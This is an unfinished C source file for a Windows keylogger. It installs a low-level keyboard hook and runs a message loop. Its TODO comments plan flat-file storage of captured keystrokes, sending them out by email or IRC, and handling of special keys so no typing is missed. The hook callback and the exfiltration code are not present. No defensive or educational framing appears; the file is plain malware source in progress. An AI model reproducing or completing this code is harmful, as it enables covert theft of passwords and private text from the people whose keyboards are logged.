/*
TODO:
    make a storage system (flat file)
    make a transport system (email most likely, IRC requires an IRC server...)
    fix caps lock bug (if caps is on when start, we don't know. so just learn when caps goes off, and consider everything before it reversed.
    fill out special keys, so we aren't blinded when someone types a quesiton mark. - proving difficult, £ sign isn't in ASCII.
*/

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "keylog.h"

HHOOK kbdhook;
int capsOn;
char buf[300];

int main()
{
    HINSTANCE MH;
    MSG M;
    printf("Hello world!\n");

    capsOn = 0;
    MH = GetModuleHandle(NULL);
    kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKeyboardProc, MH, NULL);

    while(1)
    {
        GetMessage(&M, NULL, 0, 0);

        // somehow we need the character data back here, I don't know how. or, we could use threads... lol.
    }

    return 0;
}
